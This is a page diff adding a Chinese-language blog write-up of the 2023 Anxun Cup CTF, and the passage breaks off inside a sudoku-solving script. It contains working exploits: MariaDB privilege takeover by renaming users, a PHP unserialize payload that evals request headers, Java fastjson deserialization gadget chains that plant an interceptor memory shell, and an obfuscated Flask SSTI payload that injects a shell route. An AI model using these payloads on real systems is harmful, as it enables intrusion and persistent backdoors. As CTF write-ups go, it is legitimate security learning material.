@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            安洵杯2023-wp
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="CarelessPy"><a href="#CarelessPy" class="headerlink" title="CarelessPy"></a>CarelessPy</h2><p>看过start.sh，但是py_compile没了解过…….队友lolita做出来的。</p>
+<p><a target="_blank" rel="noopener" href="https://docs.python.org/3/library/py_compile.html">https://docs.python.org/3/library/py_compile.html</a></p>
+<blockquote>
+<p>py_compile.<strong>compile</strong>(<em>file</em>, <em>cfile&#x3D;None</em>, <em>dfile&#x3D;None</em>, <em>doraise&#x3D;False</em>, <em>optimize&#x3D;- 1</em>, <em>invalidation_mode&#x3D;PycInvalidationMode.TIMESTAMP</em>, <em>quiet&#x3D;0</em>)</p>
+<p>Compile a source file to byte-code and write out the byte-code cache file. The source code is loaded from the file named <em>file</em>. The byte-code is written to <em>cfile</em>, which defaults to the <a target="_blank" rel="noopener" href="https://peps.python.org/pep-3147/"><strong>PEP 3147</strong></a>&#x2F;<a target="_blank" rel="noopener" href="https://peps.python.org/pep-0488/"><strong>PEP 488</strong></a> path, ending in <code>.pyc</code>. For example, if <em>file</em> is <code>/foo/bar/baz.py</code> <em>cfile</em> will default to <code>/foo/bar/__pycache__/baz.cpython-32.pyc</code> for Python 3.2. If <em>dfile</em> is specified, it is used instead of <em>file</em> as the name of the source file from which source lines are obtained for display in exception tracebacks. If <em>doraise</em> is true, a <a target="_blank" rel="noopener" href="https://docs.python.org/3/library/py_compile.html#py_compile.PyCompileError"><code>PyCompileError</code></a> is raised when an error is encountered while compiling <em>file</em>. If <em>doraise</em> is false (the default), an error string is written to <code>sys.stderr</code>, but no exception is raised. This function returns the path to byte-compiled file, i.e. whatever <em>cfile</em> value was used.</p>
+</blockquote>
+<p>编译时候会在当前目录生成__pycache__，里面存了字节码，下载后反编译可以拿到secret_key，伪造cookie登录后是个xml文件，然后是xxe注入。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230611120521849.png" alt="image-20230611120521849.png"></p>
+<h2 id="Confronting-robot"><a href="#Confronting-robot" class="headerlink" title="Confronting robot"></a>Confronting robot</h2><p>还是lolita做的。一开始我还在傻傻地手写sql注入脚本，他已经sqlmap跑出来了。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230611120903242.png" alt="image-20230611120903242.png"><br>得到个页面。</p>
+<p>这个页面有个code参数，先跑一遍sqlmap，没啥东西。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230611121020735.png" alt="image-20230611121020735.png"></p>
+<p>看了题目的描述，加上自己测试，发现code直接输sql语句即可，没有过滤。题目意思是让我们修改round choice的数据，即机器人第round轮猜拳的choice，插10条数据进去，再和机器人比猜拳，赢了就行。</p>
+<p>呜呜呜mariadb权限了解的少，没往权限那方面想，傻傻地insert，咦怎么数据插入不了？</p>
+<p>下面是lolita的做法，他当时没注意到secret有SUPER权限。我赛后恶补一波mariadb权限知识后然后本地复现的。</p>
+<hr>
+<p>大致原理：</p>
+<p>第一个页面的用户是index_user。</p>
+<p>第二个页面的用户是secret，有CREATE USER，select *.*，SUPER权限。（SUPER权限在这种做法用不到，写日志才用到）</p>
+<p>secure_file_priv是空的，可写文件。</p>
+<p>secret用户修改root用户哈希为index_user的哈希，删去index_user，将root改名为index_user。</p>
+<p>此时index_user相当于root，sqlmap连上，写shell。</p>
+<hr>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>准备工作。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create user root2 identified by &#x27;123&#x27;;</span><br><span class="line">create user create_user identified by &#x27;333&#x27;;#比赛时的secret用户，第二个页面</span><br><span class="line">create user index_user identified by &#x27;333&#x27;;#比赛时index_user用户，第一个页面</span><br><span class="line">grant all privileges on *.* to root2;</span><br><span class="line">grant create user,select on *.* to create_user;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>开始测试。</p>
+<p>登录create_user（）</p>
+<p>查看权限：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230611112434847.png" alt="image-20230611112434847.png"><br>查看密码哈希。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230611110028366.png" alt="image-20230611110028366.png"><br>执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter user root2 identified by password &#x27;*44019FB6C583EFACD2FB2F1A1960B97F86E36A74&#x27;;</span><br><span class="line">drop user index_user;</span><br><span class="line">rename user &#x27;root2&#x27; to &#x27;index_user&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230611112658816.png" alt="image-20230611112658816.png"><br>查看结果：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230611112718075.png" alt="image-20230611112718075.png"><br>登录到index_user查看权限：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230611112745456.png" alt="image-20230611112745456.png"><br>可以看到权限转移到了index_user这里。</p>
+<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>本地mysql和mariadb都测了，只有mariadb支持设置密码哈希的选项，mysql 5 8都不行。所以上面的做法如果拿不到index_user的明文密码，只有mariadb能做，mysql不可。</p>
+<p>mariadb的文档：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230611095226595.png" alt="image-20230611095226595.png"><br>mysql的文档并没有这种写法，且自己测试也报语法错误。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230611104554832.png" alt="image-20230611104554832.png"></p>
+<p>我比赛时注意到SUPER权限，且已经成功写日志了，但是我去访问马的时候提示Access Denied？？？我以为是secret没有FILE权限，所以不能写东西。赛后本地测，发现只要有SUPER权限就能写日志马。好想再上靶机看看自己哪里搞错了(艹皿艹 )。</p>
+<h2 id="4号的罗纳尔多"><a href="#4号的罗纳尔多" class="headerlink" title="4号的罗纳尔多"></a>4号的罗纳尔多</h2><p>第一个正则过了，第二个__halt_compiler();想不到，也没搜到……</p>
+<p>源码，版本是php8.2：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class evil&#123;</span><br><span class="line">    public $cmd;</span><br><span class="line">    public $a;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if(&#x27;VanZZZZY&#x27; === preg_replace(&#x27;/;+/&#x27;,&#x27;VanZZZZY&#x27;,preg_replace(&#x27;/[A-Za-z_\(\)]+/&#x27;,&#x27;&#x27;,$this-&gt;cmd)))&#123;</span><br><span class="line">            eval($this-&gt;cmd.&#x27;givemegirlfriend!&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &#x27;nonono2&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(!preg_match(&#x27;/^[Oa]:[\d]+|Array|Iterator|Object|List/i&#x27;,$_GET[&#x27;Pochy&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;Pochy&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &#x27;nonono&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>exp：要用php7运行，php8的不行，不知道为什么。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class evil&#123;</span><br><span class="line">    public $cmd = &quot;eval(end(getallheaders()));__halt_compiler();&quot;;</span><br><span class="line">    public $a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$e = new evil();</span><br><span class="line">$a = new SplStack();</span><br><span class="line">$a-&gt;push($e);</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230611141305006.png" alt="image-20230611141305006.png"></p>
+<h2 id="sleepwalker"><a href="#sleepwalker" class="headerlink" title="sleepwalker"></a>sleepwalker</h2><p>知识点：</p>
+<p>fastjson，JSONArray的toString() -&gt; getter</p>
+<p>XString.equals 触发 toString</p>
+<p>StyledEditorKit.AlignmentAction 利用</p>
+<p>EventListenerList的readObject-&gt;toString</p>
+<p>字节码修改</p>
+<h3 id="修改字节码"><a href="#修改字节码" class="headerlink" title="修改字节码"></a>修改字节码</h3><p>还不会用javaassist+javaagent改字节码，只能改rt.jar。</p>
+<p>重写ArrayTable.java，编译后覆盖掉rt.jar里的ArrayTable.class。注意自己编译的包名要和原来的一样。</p>
+<p>rt.jar直接当成zip解压，再当成zip压缩回去，改后缀为jar。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static void writeArrayTable(ObjectOutputStream s, ArrayTable table) throws IOException &#123;</span><br><span class="line">    if (table != null &amp;&amp; table.getKeys((Object[])null) != null) &#123;</span><br><span class="line">        int validCount = false;</span><br><span class="line">        s.writeInt(3);</span><br><span class="line">        s.writeObject(table.get(&quot;test&quot;));</span><br><span class="line">        s.writeObject(&quot;111&quot;);</span><br><span class="line">        s.writeObject(&quot;11&quot;);</span><br><span class="line">        s.writeObject(table.get(&quot;11&quot;));</span><br><span class="line">        s.writeObject(&quot;11&quot;);</span><br><span class="line">        s.writeObject(table.get(&quot;12&quot;));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        s.writeInt(0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对Alignment对象的设置：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alignmentAction.putValue(&quot;test&quot;,&quot;hhhhhh&quot;); //随便设置</span><br><span class="line">alignmentAction.putValue(&quot;11&quot;,xString);	   //对应上面的s.writeObject(table.get(&quot;11&quot;));</span><br><span class="line">alignmentAction.putValue(&quot;12&quot;,objects2);   //对应s.writeObject(table.get(&quot;12&quot;));</span><br></pre></td></tr></table></figure>
+
+<p>AbstractAction的readObject，循环putValue。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230615100641155.png" alt="image-20230615100641155.png"><br><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230615100706557.png" alt="image-20230615100706557.png"><br>第一次循环，arrayTable为null，创建arrayTable。</p>
+<p>第二次循环，将xstring put进arrayTable里，key为11。</p>
+<p>第三次循环，key是11，oldValue为xstring，newValue为object2（JSONArray）。开始触发JSONArray的toString。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSONArray;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line">import unknown.tools.Gadget;</span><br><span class="line">import unknown.tools.MyMethods;</span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import javax.swing.*;</span><br><span class="line">import javax.swing.event.SwingPropertyChangeSupport;</span><br><span class="line">import javax.swing.text.StyledEditorKit;</span><br><span class="line">import java.security.SignedObject;</span><br><span class="line"></span><br><span class="line">public class SleepWalker &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        TemplatesImpl interceptorShell = Gadget.getInterceptorShell();</span><br><span class="line"></span><br><span class="line">        JSONArray objects = new JSONArray();</span><br><span class="line"></span><br><span class="line">        objects.add(interceptorShell);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException bd = Gadget.getBadAttributeValueExpException(objects);</span><br><span class="line">        SignedObject singnedObject = Gadget.getSingnedObject(bd);</span><br><span class="line"></span><br><span class="line">        JSONArray objects2 = new JSONArray();</span><br><span class="line"></span><br><span class="line">        objects2.add(singnedObject);</span><br><span class="line"></span><br><span class="line">        XString xString = new XString(&quot;asd&quot;);</span><br><span class="line"></span><br><span class="line">        StyledEditorKit.AlignmentAction alignmentAction = new StyledEditorKit.AlignmentAction(&quot;1&quot;,1);</span><br><span class="line"></span><br><span class="line">        MyMethods.setFieldValue(alignmentAction,&quot;changeSupport&quot;,new SwingPropertyChangeSupport(&quot;hhh&quot;,true));</span><br><span class="line"></span><br><span class="line">        alignmentAction.putValue(&quot;test&quot;,&quot;hhhhhh&quot;);</span><br><span class="line">        alignmentAction.putValue(&quot;11&quot;,xString);</span><br><span class="line">        alignmentAction.putValue(&quot;12&quot;,objects2);</span><br><span class="line"></span><br><span class="line">        ActionMap actionMap = new ActionMap();//题目限定反序列化的第一个类的父类不能为AbstractAction，故用ActionMap。</span><br><span class="line">        actionMap.put(&quot;test&quot;,alignmentAction);//对应修改的字节码的test</span><br><span class="line"></span><br><span class="line">        System.out.println(MyMethods.URLEncode(MyMethods.base64Encode(MyMethods.serialize(actionMap))));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="SSTI内存马"><a href="#SSTI内存马" class="headerlink" title="SSTI内存马"></a>SSTI内存马</h3><p>原本的样子：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=&#123;%print(get_flashed_messages[&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;exec&#x27;](&#x27;def shell():\n\treturn \&#x27;base64\&#x27;\napp.add_url_rule(\&#x27;/status\&#x27;,\&#x27;shell\&#x27;,shell)&#x27;,&#123;&#x27;_request_ctx_stack&#x27;: get_flashed_messages[&#x27;__globals__&#x27;][&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;: get_flashed_messages[&#x27;__globals__&#x27;][&#x27;current_app&#x27;]&#125;))%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>16进制绕过滤：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=&#123;%25print(get_flashed_messages[&#x27;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&#x27;][&#x27;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#x27;][&#x27;\x65\x78\x65\x63&#x27;](&#x27;def shell():\n\treturn \&#x27;base64\&#x27;\napp\x2eadd_url_rule(\&#x27;/status\&#x27;,\&#x27;shell\&#x27;,shell)&#x27;,&#123;&#x27;\x5f\x72\x65\x71\x75\x65\x73\x74\x5f\x63\x74\x78\x5f\x73\x74\x61\x63\x6b&#x27;: get_flashed_messages[&#x27;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&#x27;][&#x27;\x5f\x72\x65\x71\x75\x65\x73\x74\x5f\x63\x74\x78\x5f\x73\x74\x61\x63\x6b&#x27;],&#x27;app&#x27;: get_flashed_messages[&#x27;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&#x27;][&#x27;current_app&#x27;]&#125;))%25&#125;</span><br></pre></td></tr></table></figure>
+
+<p>base64那个位置换成上面exp生成一大串的base64。注意base64末尾生成的&#x3D;号要去掉，因为flask过滤。实测去掉了也可以正常反序列化。</p>
+<p>访问：<code>http://192.168.190.129:32159/breakme?cmd=.....</code></p>
+<p>此时flask内存马已经打入，访问<code>http://192.168.190.129:32159/status</code>看看效果</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230615130319007.png" alt="image-20230615130319007.png"><br>此时访问两次<code>http://192.168.190.129:32159/heartbeat</code></p>
+<p>第一次读取&#x2F;status返回的base64并写到&#x2F;tmp&#x2F;tmp.ser里</p>
+<p>第二次读取&#x2F;tmp&#x2F;tmp.ser的base64，反序列化，打入拦截器内存马。</p>
+<p>成功执行命令：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230615130552362.png" alt="image-20230615130552362.png"></p>
+<h3 id="另一条链"><a href="#另一条链" class="headerlink" title="另一条链"></a>另一条链</h3><p>lolita师傅告诉我的哈哈哈哈。</p>
+<p>javax.swing.event.EventListenerList，readObject-&gt;toString。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSONArray;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line">import unknown.tools.Gadget;</span><br><span class="line">import unknown.tools.MyMethods;</span><br><span class="line"></span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import javax.swing.*;</span><br><span class="line">import javax.swing.event.EventListenerList;</span><br><span class="line">import javax.swing.event.SwingPropertyChangeSupport;</span><br><span class="line">import javax.swing.text.StyledEditorKit;</span><br><span class="line">import java.security.SignedObject;</span><br><span class="line"></span><br><span class="line">public class SleepWalker &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        TemplatesImpl interceptorShell = Gadget.getInterceptorShell();</span><br><span class="line"></span><br><span class="line">        JSONArray objects = new JSONArray();</span><br><span class="line"></span><br><span class="line">        objects.add(interceptorShell);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException bd = Gadget.getBadAttributeValueExpException(objects);</span><br><span class="line">        SignedObject singnedObject = Gadget.getSingnedObject(bd);</span><br><span class="line"></span><br><span class="line">        JSONArray objects2 = new JSONArray();</span><br><span class="line"></span><br><span class="line">        objects2.add(singnedObject);</span><br><span class="line"></span><br><span class="line">        XString xString = new XString(&quot;asd&quot;);</span><br><span class="line"></span><br><span class="line">        EventListenerList eventListenerList = Gadget.getEventListenerList(objects2);</span><br><span class="line"></span><br><span class="line">        System.out.println(MyMethods.URLEncode(MyMethods.base64Encode(MyMethods.serialize(eventListenerList))));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Gadget.getEventListenerList：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static EventListenerList getEventListenerList(Object obj) throws Exception&#123;</span><br><span class="line">    EventListenerList list = new EventListenerList();</span><br><span class="line">    UndoManager manager = new UndoManager();</span><br><span class="line">    Vector vector = (Vector)MyMethods.getFieldValue(manager, &quot;edits&quot;);</span><br><span class="line">    vector.add(obj);</span><br><span class="line">    MyMethods.setFieldValue(list, &quot;listenerList&quot;, new Object[]&#123;InternalError.class, manager&#125;);</span><br><span class="line">    return list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="sudoku-easy"><a href="#sudoku-easy" class="headerlink" title="sudoku_easy"></a>sudoku_easy</h2><p>CTFer特有的不按套路出牌。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230610095707838.png" alt="image-20230610095707838.png"></p>
+<h2 id="烦人的压缩包"><a href="#烦人的压缩包" class="headerlink" title="烦人的压缩包"></a>烦人的压缩包</h2><p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230610094943141.png" alt="image-20230610094943141.png"></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230610095014545.png" alt="image-20230610095014545.png"></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230610095059259.png" alt="image-20230610095059259.png"></p>
+<p>提示文件损坏这里卡了一小会，以为是伪加密什么的，然后翻一翻zip文件的结构，发现这个zip的压缩方式给改成00了，改回08即可打开。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230610095210454.png" alt="image-20230610095210454.png"></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230610095228706.png" alt="image-20230610095228706.png"></p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/SYCTF2023/image-20230610095240029.png" alt="image-20230610095240029.png"></p>
+<h2 id="sudoku-speedrun"><a href="#sudoku-speedrun" class="headerlink" title="sudoku_speedrun"></a>sudoku_speedrun</h2><p>题目要求是10s内解数独。多次测试后发现，若按R重新开始，题目还是原来的，但是时间重新计算了。所以我们可以不断R Y 循环，这样就有时间解数独了。但是就算解出来，也无法在10s内全部填完，所以要写脚本了。</p>
+<p>写脚本测试过程中发现，可以一次性发送答案，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tn.write(b&#x27;1d1d1d1d&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>这样表示在当前位置填1，然后右移，填1，右移，填1…</p>
+<p>所以最终思路就是，让线程A循环发送r y，保证题目不断，然后线程B监听输入，只要B收到输入了，发给A，A再发给靶机。我们要做的就是另起一个脚本，解出数独，并转化为上面那种字符串，再输入给B即可。</p>
+<p>（理论上只要手够快，r y 循环那部分可以省略）</p>
+<p>下面是exp：</p>
+<p>和靶机交互的脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import telnetlib</span><br><span class="line">import time,threading</span><br><span class="line"></span><br><span class="line">global payload</span><br><span class="line">payload = &#x27;1&#x27;</span><br><span class="line">def main():</span><br><span class="line">    global payload</span><br><span class="line">    tn = telnetlib.Telnet(&#x27;47.108.165.60&#x27;,port=40689)</span><br><span class="line">    res = tn.read_until(b&#x27;Please input\r\n&gt;&#x27;)</span><br><span class="line">    print(res)</span><br><span class="line">    tn.write(b&#x27;1\n&#x27;)</span><br><span class="line">    res = tn.read_until(b&#x27;hard(7)\r\n&gt;&#x27;)</span><br><span class="line">    print(res)</span><br><span class="line">    tn.write(b&#x27;5\n&#x27;)</span><br><span class="line">    tn.write(b&#x27;r&#x27;)</span><br><span class="line">    res = tn.read_until(b&#x27;Retstart the game? (Y):&#x27;)</span><br><span class="line">    print(res.decode())</span><br><span class="line">    while True:</span><br><span class="line">        tn.write(b&#x27;y\n&#x27;)</span><br><span class="line">        if payload != &#x27;1&#x27;:</span><br><span class="line">            tn.write(payload)</span><br><span class="line">            res = tn.read_all()</span><br><span class="line">            print(res.decode())</span><br><span class="line">            break</span><br><span class="line">        time.sleep(2)</span><br><span class="line">        tn.write(b&#x27;r\n&#x27;)</span><br><span class="line">        time.sleep(1)</span><br><span class="line"></span><br><span class="line">def listen():</span><br><span class="line">    global payload</span><br><span class="line">    res = input(&#x27;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&#x27;)</span><br><span class="line">    payload = res.encode()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    thread_1 = threading.Thread(target=listen)</span><br><span class="line">    thread_2 = threading.Thread(target=main)</span><br><span class="line">    thread_1.start()</span><br><span class="line">    thread_2.start()</span><br></pre></td></tr></table></figure>
+
+<p>解数独并将答案转为字符串的脚本：</p>
+<p>解数独脚本来自：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/87744766">https://zhuanlan.zhihu.com/p/87744766</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#-*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import random,copy</span><br><span class="line">import sys</span><br><span class="line">sys.setrecursionlimit(100000)</span><br><span class="line"></span><br><span class="line">def get_next(m:&quot;数独矩阵&quot;, x:&quot;空白格行数&quot;, y:&quot;空白格列数&quot;):</span><br><span class="line">    &quot;&quot;&quot; 功能：获得下一个空白格在数独中的坐标。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    for next_y in range(y+1, 9):  # 下一个空白格和当前格在一行的情况</span><br><span class="line">        if m[x][next_y] == 0:</span><br><span class="line">            return x, next_y</span><br><span class="line">    for next_x in range(x+1, 9):  # 下一个空白格和当前格不在一行的情况</span><br><span class="line">        for next_y in range(0, 9):</span><br><span class="line">            if m[next_x][next_y] == 0:</span><br><span class="line">                return next_x, next_y</span><br><span class="line">    return -1, -1               # 若不存在下一个空白格，则返回 -1，-1</span><br><span class="line"></span><br><span class="line">def value(m:&quot;数独矩阵&quot;, x:&quot;空白格行数&quot;, y:&quot;空白格列数&quot;):</span><br><span class="line">    &quot;&quot;&quot; 功能：返回符合&quot;每个横排和竖排以及</span><br><span class="line">              九宫格内无相同数字&quot;这个条件的有效值。</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    i, j = x//3, y//3</span><br><span class="line">    grid = [m[i*3+r][j*3+c] for r in range(3) for c in range(3)]</span><br><span class="line">    v = set([x for x in range(1,10)]) - set(grid) - set(m[x]) - \</span><br><span class="line">        set(list(zip(*m))[y])</span><br><span class="line">    return list(v)</span><br><span class="line"></span><br><span class="line">def start_pos(m:&quot;数独矩阵&quot;):</span><br><span class="line">    &quot;&quot;&quot; 功能：返回第一个空白格的位置坐标&quot;&quot;&quot;</span><br><span class="line">    for x in range(9):</span><br><span class="line">        for y in range(9):</span><br><span class="line">            if m[x][y] == 0:</span><br><span class="line">                return x, y</span><br><span class="line">    return False, False  # 若数独已完成，则返回 False, False</span><br><span class="line"></span><br><span class="line">def try_sudoku(m:&quot;数独矩阵&quot;, x:&quot;空白格行数&quot;, y:&quot;空白格列数&quot;):</span><br><span class="line">    &quot;&quot;&quot; 功能：试着填写数独 &quot;&quot;&quot;</span><br><span class="line">    for v in value(m, x, y):</span><br><span class="line">        m[x][y] = v</span><br><span class="line">        next_x, next_y = get_next(m, x, y)</span><br><span class="line">        if next_y == -1: # 如果无下一个空白格</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            end = try_sudoku(m, next_x, next_y) # 递归</span><br><span class="line">            if end:</span><br><span class="line">                return True</span><br><span class="line">            m[x][y] = 0 # 在递归的过程中，如果数独没有解开，</span><br><span class="line">                        # 则回溯到上一个空白格</span><br><span class="line"></span><br><span class="line">def sudoku(m):</span><br><span class="line">    x, y = start_pos(m)</span><br><span class="line">    try_sudoku(m, x, y)</span><br><span class="line">    # for i in m:</span><br><span class="line">    #     print(i)</span><br><span class="line">    return m</span><br><span class="line"></span><br><span class="line">def getTrack(question,answer):</span><br><span class="line">    track = &#x27;&#x27;</span><br><span class="line">    for i in range(len(question)):</span><br><span class="line">        for j in range(len(question[i])):</span><br><span class="line">            if question[i][j] == 0:</span><br><span class="line">                track += str(answer[i][j])</span><br><span class="line">                track += &#x27;d&#x27;</span><br><span class="line">            else:</span><br><span class="line">                track+=&#x27;d&#x27;</span><br><span class="line">        track+=&#x27;a&#x27;*9+&#x27;s&#x27;</span><br><span class="line">    print(track)</span><br><span class="line"></span><br><span class="line">def strToArray(s):</span><br><span class="line">    sudo = []</span><br><span class="line">    for i in s.split(&#x27;\n&#x27;):</span><br><span class="line">        line = []</span><br><span class="line">        for j in i:</span><br><span class="line">            if j in &#x27;0123456789&#x27;:</span><br><span class="line">                line.append(int(j))</span><br><span class="line">        sudo.append(line)</span><br><span class="line">    return sudo</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    s = &#x27;&#x27;&#x27;| 0 0 7 | 1 3 0 | 8 6 0 | </span><br><span 